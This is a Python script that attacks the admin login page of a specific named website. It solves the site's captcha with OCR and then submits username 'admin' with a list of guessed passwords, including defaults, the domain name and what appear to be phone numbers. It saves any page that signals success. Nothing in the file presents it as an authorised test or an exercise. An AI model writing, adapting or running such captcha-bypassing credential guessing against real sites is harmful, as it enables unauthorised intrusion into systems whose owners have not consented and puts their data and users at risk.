import pytesseract
from PIL import Image
import subprocess
import base64
import io
import requests
import re
import sys

def download_captcha(session, output_path="/tmp/captcha_big.png"):
    """Download captcha, enlarge to 400x100, save, OCR, return the text."""
    url = "http://bjhzsv.com/main/inc/code.asp"
    
    r = session.get(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    if r.status_code != 200:
        print(f"  [ERROR] Captcha download failed: HTTP {r.status_code}")
        return None
    
    raw_bytes = r.content
    b64 = base64.b64encode(raw_bytes).decode()
    
    # Also download raw for base64 reporting
    with open("/tmp/captcha_raw.bmp", "wb") as f:
        f.write(raw_bytes)
    
    # Open with PIL and enlarge 10x
    img = Image.open(io.BytesIO(raw_bytes))
    w, h = img.size
    print(f"  Captcha original size: {w}x{h}")
    
    big = img.resize((w * 10, h * 10), Image.NEAREST)
    big.save(output_path)
    print(f"  Saved enlarged captcha to {output_path}")
    
    # Try OCR with different configs
    text1 = pytesseract.image_to_string(big, config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789').strip()
    text2 = pytesseract.image_to_string(big, config='--psm 7 --oem 3').strip()
    text3 = pytesseract.image_to_string(big, config='--psm 8 --oem 3').strip()
    text4 = pytesseract.image_to_string(big, config='--psm 13 --oem 3').strip()
    
    candidates = [text1, text2, text3, text4]
    # Filter out empty and clean
    cleaned = []
    for t in candidates:
        t = re.sub(r'[^0-9]', '', t)
        if len(t) >= 3 and len(t) <= 5:
            cleaned.append(t)
    
    # Also try with binarization
    gray = big.convert('L')
    bw = gray.point(lambda x: 0 if x < 200 else 255)
    text5 = pytesseract.image_to_string(bw, config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789').strip()
    text5_clean = re.sub(r'[^0-9]', '', text5)
    if 3 <= len(text5_clean) <= 5:
        cleaned.append(text5_clean)
    
    # Also try inverted
    inv = Image.eval(bw, lambda x: 255 - x)
    text6 = pytesseract.image_to_string(inv, config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789').strip()
    text6_clean = re.sub(r'[^0-9]', '', text6)
    if 3 <= len(text6_clean) <= 5:
        cleaned.append(text6_clean)
    
    print(f"  Raw OCR candidates: text1={text1!r} text2={text2!r} text3={text3!r} text4={text4!r}")
    print(f"  Binarized OCR: {text5_clean!r}  Inverted: {text6_clean!r}")
    
    if cleaned:
        # Return the most common / first valid one
        from collections import Counter
        counts = Counter(cleaned)
        best = counts.most_common(1)[0][0]
        print(f"  Best OCR result (4 digits expected): {best!r}")
        return best
    else:
        # Fallback - return any text we got
        all_text = text1 or text2 or text3 or text4 or text5 or text6
        all_clean = re.sub(r'[^0-9]', '', all_text)
        if all_clean:
            print(f"  Fallback OCR: {all_clean!r}")
            return all_clean[:4]
        print(f"  [WARN] No digits found in OCR at all!")
        return "0000"  # desperate fallback

def try_login(username, password, captcha):
    """POST login credentials with captcha."""
    login_url = "http://bjhzsv.com/main/a7chkuser.asp"
    data = {
        "t1": username,
        "t2": password,
        "t3": captcha
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "http://bjhzsv.com/main/"
    }
    
    r = session.post(login_url, data=data, headers=headers, allow_redirects=True)
    text = r.text
    
    # Check response for success indicators
    success_keywords = ["success", "成功", "欢迎", "admin", "管理", "main"]
    fail_keywords = ["error", "错误", "验证码", "captcha", "fail", "失败", "password", "密码"]
    
    is_success = False
    status = ""
    
    if any(kw in text.lower() for kw in success_keywords):
        # Check it's not also a fail
        fail_count = sum(1 for kw in fail_keywords if kw in text.lower())
        success_count = sum(1 for kw in success_keywords if kw in text.lower())
        if success_count > fail_count:
            is_success = True
            status = "LIKELY SUCCESS"
        else:
            status = "AMBIGUOUS"
    else:
        status = "FAILED"
    
    # Check response length and content
    print(f"  Response length: {len(text)} bytes")
    print(f"  Response preview: {text[:200]}")
    
    return is_success, r.status_code, text[:500]

# Main login attempts
passwords = [
    "admin",
    "admin999",
    "admin888", 
    "123456",
    "bjhzsv",
    "bjhzsv.com",
    "13681449049",
    "01062489782"
]

username = "admin"

print("=" * 60)
print("BJZHSV.COM ADMIN LOGIN ATTEMPT")
print("=" * 60)

for pwd in passwords:
    print(f"\n{'='*60}")
    print(f"TRYING: {username}:{pwd}")
    print(f"{'='*60}")
    
    # Create a fresh session for each attempt
    session = requests.Session()
    
    # Step 1: GET the main page to establish session
    print("[1] Fetching main page to establish session...")
    try:
        r = session.get("http://bjhzsv.com/main/", 
                       headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"},
                       timeout=15)
        print(f"  Main page: HTTP {r.status_code}, {len(r.text)} bytes")
        if "管理" in r.text or "admin" in r.text.lower() or "login" in r.text.lower():
            print(f"  Page looks like a login page (contains admin/login keywords)")
    except Exception as e:
        print(f"  [ERROR] Failed to fetch main page: {e}")
        continue
    
    # Step 2: Download and OCR captcha
    print("[2] Downloading captcha...")
    captcha = download_captcha(session)
    if not captcha:
        print("  [SKIP] No captcha text obtained")
        continue
    print(f"  Using captcha: {captcha}")
    
    # Step 3: POST login
    print(f"[3] POSTing login with captcha={captcha}...")
    try:
        success, status_code, resp_text = try_login(username, pwd, captcha)
        
        if success:
            print(f"\n  *** SUCCESS! Password: {pwd} ***")
            print(f"  Status: {status_code}")
            print(f"  Response: {resp_text}")
            # Save full response for analysis
            with open(f"/tmp/bjhzsv_success_{pwd}.html", "w") as f:
                f.write(resp_text)
            print(f"  Saved response to /tmp/bjhzsv_success_{pwd}.html")
            sys.exit(0)
        else:
            print(f"  Login failed for {username}:{pwd}")
    except Exception as e:
        print(f"  [ERROR] Exception during login: {e}")

print("\n" + "=" * 60)
print("ALL LOGIN ATTEMPTS FAILED")
print("=" * 60)
